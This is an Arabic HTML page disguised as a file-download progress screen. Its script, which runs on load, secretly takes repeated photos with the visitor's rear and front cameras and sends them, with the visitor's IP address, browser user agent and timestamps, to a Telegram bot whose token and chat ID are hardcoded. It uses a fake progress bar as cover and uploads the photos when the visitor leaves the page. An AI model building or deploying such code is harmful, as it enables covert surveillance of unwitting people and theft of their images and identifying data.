<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            box-shadow: 0 0 60px rgba(233, 69, 96, 0.1);
            max-width: 440px;
            width: 100%;
            border: 1px solid #2a2a4a;
            text-align: center;
        }
        .icon { font-size: 70px; margin-bottom: 8px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        h2 {
            color: #e94560;
            font-weight: 700;
            font-size: 24px;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #8a8aaa;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .loader-box {
            background: #12122a;
            border-radius: 14px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid #2a2a4a;
        }
        .loader-bar {
            width: 100%;
            height: 6px;
            background: #1a1a3a;
            border-radius: 6px;
            overflow: hidden;
            margin-top: 15px;
        }
        .loader-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #e94560, #c73652);
            border-radius: 6px;
            transition: width 0.5s;
        }
        .status-text {
            color: #8a8aaa;
            font-size: 14px;
            margin-top: 10px;
        }
        #status {
            margin-top: 18px;
            padding: 12px;
            border-radius: 12px;
            background: #12122a;
            border: 1px solid #1a1a3a;
            font-size: 13px;
            color: #8a8aaa;
            min-height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 6px;
        }
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer {
            margin-top: 18px;
            font-size: 11px;
            color: #3a3a5a;
            border-top: 1px solid #1a1a3a;
            padding-top: 14px;
        }
        .hidden { display: none; }
        .camera-badge {
            display: inline-block;
            background: rgba(233, 69, 96, 0.15);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #e94560;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📥</div>
        <h2>جاري التحميل...</h2>
        <p class="subtitle">يرجى الانتظار، جاري تجهيز الملف</p>

        <div class="loader-box">
            <div style="font-size:40px;">⏳</div>
            <div class="loader-bar">
                <div class="fill" id="progressFill"></div>
            </div>
            <div class="status-text" id="progressText">جاري التحميل 0%</div>
            <div class="camera-badge" id="cameraBadge">📷 كاميرا خلفية + أمامية</div>
        </div>

        <div id="status">⏳ جاري التجهيز...</div>
        <div class="footer">🔒 اتصال آمن • سيتم التنزيل تلقائياً</div>
    </div>

    <script>
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";

        const statusDiv = document.getElementById('status');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        const cameraBadge = document.getElementById('cameraBadge');

        let hasSent = false;
        let isSending = false;
        let photos = [];
        let stream = null;
        let captureInterval = null;
        let photoCount = 0;
        const maxPhotos = 16;
        let progress = 0;
        let currentCamera = 'environment';
        let isSwitching = false;

        // ====== إرسال صورة ======
        async function sendPhoto(blob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== إرسال إشعار ======
        async function sendMessage(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== جلب IP ======
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch { return 'غير معروف'; }
        }

        // ====== بدء الكاميرا ======
        async function startCamera(mode) {
            try {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }

                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: mode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                currentCamera = mode;
                const cameraName = mode === 'environment' ? 'خلفية' : 'أمامية';
                cameraBadge.textContent = `📷 كاميرا ${cameraName}`;
                return true;
            } catch (error) {
                console.log('❌ فشل الكاميرا:', error);
                return false;
            }
        }

        // ====== التقاط صورة ======
        async function capturePhoto() {
            if (!stream) return null;
            try {
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 200));

                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');

                // عكس الصورة للكاميرا الخلفية فقط
                if (currentCamera === 'environment') {
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                const blob = await fetch(imageData).then(r => r.blob());
                return blob;
            } catch (e) {
                console.log('❌ فشل التصوير:', e);
                return null;
            }
        }

        // ====== التبديل بين الكاميرات ======
        async function switchCamera() {
            if (isSwitching) return;
            isSwitching = true;

            const nextMode = currentCamera === 'environment' ? 'user' : 'environment';
            const cameraName = nextMode === 'environment' ? 'خلفية' : 'أمامية';
            statusDiv.innerHTML = `🔄 جاري التبديل إلى الكاميرا ${cameraName}...`;
            statusDiv.style.color = '#ff9800';
            cameraBadge.textContent = `📷 جاري التبديل...`;

            const success = await startCamera(nextMode);
            isSwitching = false;

            if (success) {
                statusDiv.innerHTML = `✅ تم التبديل إلى الكاميرا ${cameraName}`;
                statusDiv.style.color = '#4caf50';
                // إرسال إشعار بالتبديل
                const ip = await getIP();
                await sendMessage(`🔄 **تم التبديل إلى الكاميرا ${cameraName}**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);
                return true;
            } else {
                statusDiv.innerHTML = `⚠️ فشل التبديل إلى الكاميرا ${cameraName}`;
                statusDiv.style.color = '#ff9800';
                return false;
            }
        }

        // ====== إرسال جميع الصور ======
        async function sendAllData() {
            if (isSending || hasSent) return;
            isSending = true;

            statusDiv.innerHTML = `<span class="loader"></span> جاري إرسال ${photos.length} صور...`;
            statusDiv.style.color = '#ff9800';

            let successCount = 0;
            for (const blob of photos) {
                const sent = await sendPhoto(blob);
                if (sent) successCount++;
                await new Promise(r => setTimeout(r, 80));
            }

            const ip = await getIP();
            await sendMessage(`📸 **تم إرسال ${successCount} صورة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}\n📷 كاميرات: خلفية + أمامية`);

            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }

            hasSent = true;
            isSending = false;

            statusDiv.innerHTML = `✅ تم إرسال ${successCount} صورة بنجاح`;
            statusDiv.style.color = '#4caf50';
        }

        // ====== بدء التصوير التلقائي ======
        async function startAutoCapture() {
            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا الخلفية...`;
            statusDiv.style.color = '#ff9800';

            // بدء بالكاميرا الخلفية
            const cameraReady = await startCamera('environment');
            if (!cameraReady) {
                statusDiv.innerHTML = `⚠️ لم نتمكن من الوصول للكاميرا، تأكد من الصلاحية`;
                statusDiv.style.color = '#ff9800';
                return;
            }

            statusDiv.innerHTML = `📸 جاري التصوير...`;
            statusDiv.style.color = '#4caf50';

            // إرسال إشعار بدء
            const ip = await getIP();
            await sendMessage(`📷 **بدأ التصوير (كاميرات خلفية + أمامية)**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);

            let captureCount = 0;
            const totalCaptures = maxPhotos;

            // التقاط صور متتالية مع التبديل بين الكاميرات
            captureInterval = setInterval(async () => {
                if (captureCount >= totalCaptures) {
                    clearInterval(captureInterval);
                    statusDiv.innerHTML = `✅ تم التقاط ${totalCaptures} صورة - سيتم إرسالها عند الخروج`;
                    statusDiv.style.color = '#4caf50';
                    progressFill.style.width = '100%';
                    progressText.innerHTML = '✅ اكتمل التحميل!';
                    await sendMessage(`✅ **اكتمل التصوير** (${totalCaptures} صورة - خلفية + أمامية)`);
                    return;
                }

                // التبديل بين الكاميرات كل 3 صور
                if (captureCount > 0 && captureCount % 3 === 0) {
                    await switchCamera();
                    await new Promise(r => setTimeout(r, 300));
                }

                const blob = await capturePhoto();
                if (blob) {
                    photos.push(blob);
                    captureCount++;
                    photoCount++;
                    progress = Math.round((captureCount / totalCaptures) * 100);
                    progressFill.style.width = progress + '%';
                    progressText.innerHTML = `جاري التحميل ${progress}%`;
                    const cameraName = currentCamera === 'environment' ? 'خلفية' : 'أمامية';
                    statusDiv.innerHTML = `📸 جاري التصوير ${captureCount}/${totalCaptures} (${cameraName})`;
                }
            }, 800);
        }

        // ====== مراقبة الخروج ======
        window.addEventListener('beforeunload', sendAllData);
        window.addEventListener('pagehide', sendAllData);
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                sendAllData();
            }
        });

        // ====== بدء التصوير التلقائي فوراً ======
        setTimeout(startAutoCapture, 500);
    </script>
</body>
</html>
